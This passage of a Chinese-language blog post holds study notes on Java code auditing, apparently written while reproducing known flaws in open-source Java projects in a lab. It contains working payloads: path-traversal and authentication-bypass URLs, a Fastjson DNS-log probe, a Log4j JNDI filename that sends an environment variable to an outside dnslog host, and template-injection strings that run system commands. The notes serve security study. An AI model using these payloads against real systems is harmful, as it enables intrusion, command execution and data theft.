class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 资源文件下载接口</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> resource 资源路径参数（包含资源标识符）</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request HTTP请求对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response HTTP响应对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> Exception 可能抛出的异常</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span>  <span class="hljs-comment">// 定义GET请求映射路径</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-comment">// 获取本地资源存储的基础路径（例如：D:/upload/）</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>    <br>    <span class="hljs-comment">// 从resource参数中截取资源相对路径，并拼接成完整物理路径</span><br>    <span class="hljs-comment">// 例如：resource=&quot;profile/xxx.jpg&quot; → 截取后变成&quot;/xxx.jpg&quot; → 最终路径&quot;D:/upload/xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>    <br>    <span class="hljs-comment">// 从完整路径中提取文件名（最后一个/后的内容）</span><br>    <span class="hljs-comment">// 例如：&quot;D:/upload/xxx.jpg&quot; → &quot;xxx.jpg&quot;</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br><br>    <span class="hljs-comment">// 设置响应内容类型为二进制流（强制浏览器下载而不是直接打开）</span><br>    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>    <br>    <span class="hljs-comment">// 设置响应头，指定下载文件名（解决中文乱码等问题）</span><br>    FileUtils.setAttachmentResponseHeader(response, downloadName);<br><br>    <span class="hljs-comment">// 将文件内容写入响应输出流（实现下载）</span><br>    FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>&#125;<br></code></pre></td></tr></table></figure><p>localPath是开发人员自己设置的源代码路径，发现没有过滤..&#x2F;</p></li><li><p>构造payload(实战中要猜测文件所处的位置，文件夹名称)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8088//common/download/resource?resource=/profile/../RuoYi-v4.5.0/ruoyi-admin/src/main/resources/application-druid.yml<br></code></pre></td></tr></table></figure></li><li><p>在v4.6.0版本中的同样位置找到新版本修复了此漏洞，过滤了..&#x2F;，多了检测规则</p></li></ul><h4 id="oa-system-master案例-文件读取"><a href="#oa-system-master案例-文件读取" class="headerlink" title="oa-system-master案例(文件读取)"></a>oa-system-master案例(文件读取)</h4><ul><li><p>搜索关键字FileInputStream</p><p>找到一段相关代码，开始审计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;//**&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> /(Model model, HttpServletResponse response, <span class="hljs-meta">@SessionAttribute(&quot;userId&quot;)</span> Long userId, HttpServletRequest request)<br><span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">projectPath</span> <span class="hljs-operator">=</span> ClassUtils.getDefaultClassLoader().getResource(<span class="hljs-string">&quot;&quot;</span>).getPath();<br>System.out.println(projectPath);<br><span class="hljs-type">String</span> <span class="hljs-variable">startpath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(URLDecoder.decode(request.getRequestURI(), <span class="hljs-string">&quot;utf-8&quot;</span>));<br><br><span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> startpath.replace(<span class="hljs-string">&quot;//&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-type">File</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(rootpath, path);<br><br><span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">sos</span> <span class="hljs-operator">=</span> response.getOutputStream();<br><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(f.getPath());<br><span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) f.length()];<br>IOUtils.readFully(input, data);<br><span class="hljs-comment">// 将文件流输出到浏览器</span><br>IOUtils.write(data, sos);<br>input.close();<br>sos.close();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>读懂一段代码：从下到上追踪，找到变量的传递与函数之间的关系，理清代码即可大致读懂</p></li><li><p>打印出每个过程参数的值逐个分析</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A113.png"></p></li><li><p>发现传入的值是rootpath与path的值的拼接</p></li><li><p>构造payload：</p><ul><li><p>同样是使用..&#x2F;跳到上一级的原理</p></li><li><pre><code class="language-url">/////..///..///..///..///..//1.txt<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>  - 根据源代码，<span class="hljs-comment">//会被替换为空</span><br><br>  - 只有url中加上<span class="hljs-comment">//才能正常执行，具体原因未知</span><br><br><span class="hljs-meta">### 鉴权 未授权访问</span><br><br>[<span class="hljs-meta">Java代码审计&amp;鉴权漏洞&amp;Interceptor&amp;Filter&amp;Shiro&amp;JWT_java鉴权-CSDN博客</span>](https:<span class="hljs-comment">//blog.csdn.net/qq_46081990/article/details/135207986)</span><br><br><span class="hljs-number">1.</span> 过滤器               -- 逻辑安全问题<br><span class="hljs-number">2.</span> 自定义代码       -- 逻辑安全问题<br><span class="hljs-number">3.</span> shiro框架验证  -- 找shiro版本漏洞<br><br>- 鉴权使用的框架，拦截器，过滤器等<br><br>  ![](/img/java审计/java审计<span class="hljs-number">14.</span>png)<br>  <br>  拦截器一般流程<br>  <br>  ![](/img/java审计/java审计<span class="hljs-number">15.</span>png)<br><br><span class="hljs-meta">#### 挖掘点</span><br><br><span class="hljs-number">1.</span> 拦截器中是否鉴权<br><span class="hljs-number">2.</span> 过滤器中是否鉴权<br><span class="hljs-number">3.</span> Shiro版本及其逻辑配置<br><span class="hljs-number">4.</span> 有无JWT<br><span class="hljs-number">5.</span> 以上都没有，查找是否是自写代码鉴权<br><br><span class="hljs-meta">#### Newbee案例(拦截器)</span><br><br>- 确定鉴权使用的是哪种模式<br>  - 在pom.xml文件中搜索jwt和shiro关键字，发现并没有这两种依赖的导入<br>  - 继续通过翻看目录确定是过滤器还是拦截器<br>  - 翻看过程中发现有intercepetor目录<br>  <br>- 确定使用拦截器鉴权<br><br>- 拦截器鉴权一般写在preHandle方法内<br><br>  ```<span class="hljs-function">java</span><br><span class="hljs-function">  <span class="hljs-keyword">public</span> boolean <span class="hljs-title">preHandle</span>(<span class="hljs-params">HttpServletRequest request, HttpServletResponse response, Object o</span>) throws Exception</span> &#123;<br>      <span class="hljs-comment">// 获取当前请求的路径</span><br>      String requestServletPath = request.getServletPath();<br>      <br>      <span class="hljs-comment">// 检查请求路径是否以&quot;/admin&quot;开头且会话中没有&quot;loginUser&quot;属性（即用户未登录）</span><br>      <span class="hljs-keyword">if</span> (requestServletPath.startsWith(<span class="hljs-string">&quot;/admin&quot;</span>) &amp;&amp; <span class="hljs-literal">null</span> == request.getSession().getAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>)) &#123;<br>          <span class="hljs-comment">// 设置错误消息到会话中</span><br>          request.getSession().setAttribute(<span class="hljs-string">&quot;errorMsg&quot;</span>, <span class="hljs-string">&quot;请登陆&quot;</span>);<br>          <span class="hljs-comment">// 重定向到管理员登录页面</span><br>          response.sendRedirect(request.getContextPath() + <span class="hljs-string">&quot;/admin/login&quot;</span>);<br>          <span class="hljs-comment">// 返回false表示中断请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-comment">// 如果已登录或非admin路径请求，则清除可能的错误消息</span><br>          request.getSession().removeAttribute(<span class="hljs-string">&quot;errorMsg&quot;</span>);<br>          <span class="hljs-comment">// 返回true允许请求继续执行</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul><p>核心判断语句requestServletPath.startsWith(“&#x2F;admin”) &amp;&amp; null </p><p>路径开头以admin开头，并且session中loginUser为null</p></li><li><p>利用方式：构造路径为&#x2F;;&#x2F;admin或&#x2F;&#x2F;admin后访问</p></li><li><p>实操发现页面显示404，猜测是与浏览器有关</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A116.png"></p></li></ul><h4 id="华夏ERP案例-过滤器"><a href="#华夏ERP案例-过滤器" class="headerlink" title="华夏ERP案例(过滤器)"></a>华夏ERP案例(过滤器)</h4><ul><li><p>同样在依赖中先搜索jwt和shiro关键字，发现没有</p></li><li><p>翻找目录看到filter目录，发现是过滤器设置</p></li><li><p>过滤器核心代码在doFilter方法内</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <br>    <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <br>    <span class="hljs-comment">// 1. 将 ServletRequest/ServletResponse 转换为 HttpServletRequest/HttpServletResponse</span><br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>    <br>    <span class="hljs-comment">// 2. 获取当前请求的 URL</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>    <br>    <span class="hljs-comment">// 3. 检查用户是否已登录（session 中是否有 &quot;user&quot; 属性）</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>    <br>    <span class="hljs-comment">// 4. 如果用户已登录，直接放行请求</span><br>    <span class="hljs-keyword">if</span> (userInfo != <span class="hljs-literal">null</span>) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 5. 如果请求的是登录页（/login.html）或注册页（/register.html），直接放行</span><br>    <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>))) &#123;<br>        chain.doFilter(request, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 6. 检查请求是否在忽略列表（ignoredList）中，如果是则放行</span><br>    <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>        chain.doFilter(servletRequest, response);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 7. 检查请求是否在白名单（allowUrls）中，如果是则放行</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>            <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                chain.doFilter(request, response);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 8. 如果以上条件都不满足，说明用户未登录且访问的是受保护资源，重定向到登录页</span><br>    servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用白名单过滤绕过鉴权</p></li><li><p>抓包，在数据包url处更改</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A117.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">/login.html/../account/getAccount     =  /account/getAccount <br>/register.html/../account/getAccount  =  /account/getAccount <br>/a.js/../account/getAccount           =  /account/getAccount  <br>/user/login/../../account/getAccount  =  /account/getAccount <br></code></pre></td></tr></table></figure></li></ul><h4 id="Tumo案例-Shiro"><a href="#Tumo案例-Shiro" class="headerlink" title="Tumo案例(Shiro)"></a>Tumo案例(Shiro)</h4><ul><li><p>同样先在依赖中搜索关键字，发现此源代码使用了shiro框架</p></li><li><p>查看版本，查找资料判断是否有权限绕过漏洞</p></li><li><p>查看目录找到shiro配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">tumo.shiro.anon_url=\<br>  /login,/logout,/register,\<br>  /,/about,/p<span class="hljs-comment">/**,/links,/comment/**,/link/list,/article/list,\</span><br><span class="hljs-comment">  /css/**,/js/**,///**</span><br></code></pre></td></tr></table></figure><p>anon代表可以匿名访问(无需登录)</p></li><li><p>寻找url后带有&#x2F;**的，可以利用它访问到其他地址</p></li></ul><h4 id="FastCMS案例-JWT鉴权"><a href="#FastCMS案例-JWT鉴权" class="headerlink" title="FastCMS案例(JWT鉴权)"></a>FastCMS案例(JWT鉴权)</h4><ul><li><p>Jwt技术鉴权</p><ul><li>生成时使用空加密（逻辑代码问题）</li><li>服务端未校验签名（逻辑代码问题）</li><li>密钥默认未被修改（搭建后未修改）</li><li>密钥爆破可能性大（密钥过于简单）</li></ul></li><li><p>开始审计</p></li><li><p>搜索关键字jwt发现有包引用</p><p>或：数据包中存在jwt特征：两个点将token分解为三段</p></li><li><p>检查密钥是否修改</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A118.png"></p></li><li><p>越权实例：<a href="https://www.cnblogs.com/thebeastofwar/p/17920565.html">Nacos漏洞复现总结 - BattleofZhongDinghe - 博客园 (cnblogs.com)</a></p></li></ul><h3 id="第三方组件漏洞利用"><a href="#第三方组件漏洞利用" class="headerlink" title="第三方组件漏洞利用"></a>第三方组件漏洞利用</h3><ul><li>找存在的第三方组件(Package Checker插件)</li><li>找组件利用入口条件(根据网上已知漏洞复现条件)</li><li>找可控地方测试检测(根据网上已知漏洞利用条件)</li></ul><h4 id="Tmall案例-Fastjson"><a href="#Tmall案例-Fastjson" class="headerlink" title="Tmall案例(Fastjson)"></a>Tmall案例(Fastjson)</h4><ul><li><p>在pom.xml文件中找到FastJson的依赖项，其版本为1.2.58</p></li><li><p>漏洞触发函数   JSON.parseObject()    JSON.parse()</p><ul><li><code>JSON.parseObject()</code> 是 FastJSON 的核心方法，用于 JSON → Java 对象的转换。</li><li>比 <code>JSON.parse()</code>（返回 <code>Object</code>）更常用，因为它可以直接指定目标类型。</li></ul></li><li><p>全局搜索关键字后，继续寻找有可控变量的地方，才有利用点</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A119.png"></p><p>找到此代码并且发现此变量可控，确定此处为漏洞触发点</p></li><li><p>搭建好环境后通过代码可以判断漏洞利用点在添加商品功能处</p></li><li><p>抓取数据包，将propertyJson参数更改为poc</p><p>参考文章：<a href="https://blog.csdn.net/liguangyao213/article/details/123929296">Fastjson反序列化审计及验证_fastjson 1.2.58漏洞-CSDN博客</a></p><p>使用dns平台：{“@type”:”java.net.Inet4Address”,”val”:”3042zb.dnslog.cn”}</p><p>在实操过程中有500报错</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A120.png"></p><p>原因</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A121.png"></p><p>视频演示时可以收到访问请求</p><p>后续查看时发现bp自带的测试地址收到了访问请求</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A122.png"></p></li></ul><h4 id="Tmall-Log4j-2-10-0"><a href="#Tmall-Log4j-2-10-0" class="headerlink" title="Tmall-Log4j   2.10.0"></a>Tmall-Log4j   2.10.0</h4><ul><li><p>log4j漏洞原理</p><p><a href="https://www.freebuf.com/articles/web/364311.html">一文读懂面试官都在问的Log4J2漏洞 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895">log4j漏洞成因和原理（JNDI和LDAP）_，8849。com-CSDN博客</a></p><p> Apache log4j2-RCE 漏洞是由于Log4j2提供的lookup功能下的Jndi &#x3D;&#x3D;Lookup&#x3D;&#x3D;模块出现问题所导致的，&#x3D;&#x3D;该功能模块在输出日志信息时允许开发人员通过相应的协议去请求远程主机上的资源。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。&#x3D;&#x3D;</p></li><li><p>搜索关键字(触发点) ：logger.error  logger.info</p></li><li><p>在诸多结果中寻找带有可控变量的</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A123.png"></p><p>可以通过更改图片上传的文件名更改参数值</p></li><li><p>利用jndi注入</p><p><a href="https://xz.aliyun.com/news/11723">JNDI注入原理及利用考究-先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/csd_ct/article/details/122916620">log4j漏洞分析及总结_log4j漏洞是什么-CSDN博客</a></p></li><li><p>上传管理员头像图片后抓包，更改文件名为poc</p><p>filename&#x3D;”${jndi:ldap:&#x2F;&#x2F;${env:OS}.7ffb7b28.log.dnslog.sbs}”</p></li><li><p>jndi注入工具：【JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar】</p></li></ul><h4 id="RuoYi-v4-2-0-shiro漏洞利用"><a href="#RuoYi-v4-2-0-shiro漏洞利用" class="headerlink" title="RuoYi-v4.2.0(shiro漏洞利用)"></a>RuoYi-v4.2.0(shiro漏洞利用)</h4><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><ul><li><p>搜索关键字查找shiro依赖项，查看版本号 1.4.2</p></li><li><p>找到漏洞利用文章</p></li><li><p>在源代码中直接查找key</p><ul><li><p>搜索关键字setCipherKey，找到shiro密钥</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A124.png"></p></li></ul></li><li><p>在实战中利用工具爆破密钥，学习反序列化后选择某条攻击链，实现RCE</p></li><li><p>shiro反序列化工具：<a href="https://github.com/Ares-X/shiro-exploit">GitHub - Ares-X&#x2F;shiro-exploit: Shiro反序列化利用工具，支持新版本(AES-GCM)Shiro的key爆破，配合ysoserial，生成回显Payload</a></p></li></ul><h5 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h5><p><a href="https://www.freebuf.com/vuls/231909.html">Shiro权限绕过漏洞分析（CVE-2020-1957） - FreeBuf网络安全行业门户</a></p><ul><li><p>shiro的一般规则</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A125.png"></p></li><li><p>找到ShiroConfig.java文件查看允许匿名访问的目录</p></li><li><p>根据文章构造poc测试</p></li></ul><h4 id="Halo-H2Database"><a href="#Halo-H2Database" class="headerlink" title="Halo(H2Database)"></a>Halo(H2Database)</h4><p><a href="https://www.cnblogs.com/ArcherCY/p/17699288.html">H2 database漏洞复现 - Running_J - 博客园 (cnblogs.com)</a></p><ul><li><p>搭建好环境进入后台</p></li><li><p>访问页面<a href="http://localhost:8090/h2-console">http://localhost:8090/h2-console</a></p></li><li><p>利用jndi注入工具生成poc</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A126.png"></p></li><li><p>传值</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A127.png"></p><p>javax.naming.InitialContext</p><p>注入使用的poc</p></li><li><p>实操并未弹出计算器，猜测是jdk版本过高</p></li><li><p>此漏洞利用要求：H2 database自带的web管理页面允许外部用户访问web管理界面，且不经过身份验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//这个就是设置启用还是禁用web管理界面</span><br>spring.h2.console.enabled=<span class="hljs-literal">true</span><br><span class="hljs-comment">//这个就是设置是否允许外部用户进行访问管理界面，并不通过身份验证</span><br>spring.h2.console.settings.web-allow-others=<span class="hljs-literal">true</span><br>如果这两个设置钧开启，那么就可以利用jndi进行注入攻击。<br></code></pre></td></tr></table></figure></li></ul><h3 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h3><ol><li>找项目中是否存在模板引擎(类型及安全问题)</li><li>找模板注入利用入口条件</li><li>找可控地方进行测试检测</li></ol><ul><li><p>常见模板引擎</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A128.png"></p></li></ul><h4 id="Halo案例-FreeMarker模板"><a href="#Halo案例-FreeMarker模板" class="headerlink" title="Halo案例(FreeMarker模板)"></a>Halo案例(FreeMarker模板)</h4><p><a href="https://www.cnblogs.com/nice0e3/p/16217471.html">Java安全之freemarker 模板注入 - nice_0e3 - 博客园 (cnblogs.com)</a></p><ul><li><p>全局搜索关键字freemarker,发现源代码中有freemarker的配置</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A129.png"></p><p>发现FreeMarker的配置文件是 .ftl后缀   </p></li><li><p>修改resources\templates\themes\anatole\index.ftl文件</p><p>加入poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ftl">&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;whoami&quot;).start()&#125;<br>或<br>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;test(&quot;calc&quot;)&#125;<br></code></pre></td></tr></table></figure><p>运行此容器，打开首页发现有计算机弹出，执行了系统命令</p></li><li><p>漏洞利用</p><ul><li>找到模板文件中可控变量，写入poc</li></ul></li><li><p>此源代码没有利用入口</p></li></ul><h4 id="RuoYi-v4-6-0案例-Thymeleaf"><a href="#RuoYi-v4-6-0案例-Thymeleaf" class="headerlink" title="RuoYi-v4.6.0案例(Thymeleaf)"></a>RuoYi-v4.6.0案例(Thymeleaf)</h4><p><a href="https://xz.aliyun.com/news/9281">Thymeleaf Fragment 注入漏洞复现及新姿势扩展-先知社区 (aliyun.com)</a></p><ul><li><p>搜索关键字发现是Thymeleaf模板</p></li><li><p>找入口(寻找与文章中类似的return入口)</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A130.png"></p><p>存在可控变量的return入口</p></li><li><p>找到路由 </p><p><a href="http://localhost:8088/monitor/cache">http://localhost:8088/monitor/cache</a></p></li><li><p>抓取数据包后更改变量fragment的值，传入payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">__$&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A131.png"></p><p>成功弹出计算器</p></li></ul><h3 id="FastJson反序列化漏洞"><a href="#FastJson反序列化漏洞" class="headerlink" title="FastJson反序列化漏洞"></a>FastJson反序列化漏洞</h3><p><a href="https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw">微信公众平台 (qq.com)</a></p><p><a href="https://xz.aliyun.com/news/12174#toc-16">https://xz.aliyun.com/news/12174#toc-16</a> (Java反序列化之FastJson反序列化及绕过)</p><p><a href="https://www.ddosi.org/fastjson-payload/#Fastjson_1222-1224">Fastjson漏洞利用姿势技巧集合 | Fastjson payload - 🔰雨苁ℒ🔰 (ddosi.org)</a></p><h4 id="fastjson反序列化漏洞原理"><a href="#fastjson反序列化漏洞原理" class="headerlink" title="fastjson反序列化漏洞原理"></a>fastjson反序列化漏洞原理</h4><ul><li><p>使用AutoType功能进行序列化的JSON字符会带有一个@type来标记其字符的原始类型</p></li><li><p>在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的set或者get方法</p></li><li><p>@type的类有可能被恶意构造，构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p></li><li><p>常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！因此整个漏洞复现的原理过程就是：</p><ol><li>攻击者（我们）访问存在fastjson漏洞的目标靶机网站，通过burpsuite抓包改包，以json格式添加com.sun.rowset.JdbcRowSetImpl恶意类信息发送给目标机。</li><li>存在漏洞的靶机对json反序列化时候，会加载执行我们构造的恶意信息(访问rmi服务器)，靶机服务器就会向rmi服务器请求待执行的命令。也就是靶机服务器问rmi服务器，（靶机服务器）需要执行什么命令</li><li>rmi 服务器请求加载远程机器的class（这个远程机器是我们搭建好的恶意站点，提前将漏洞利用的代码编译得到.class文件，并上传至恶意站点），得到攻击者（我们）构造好的命令（ping 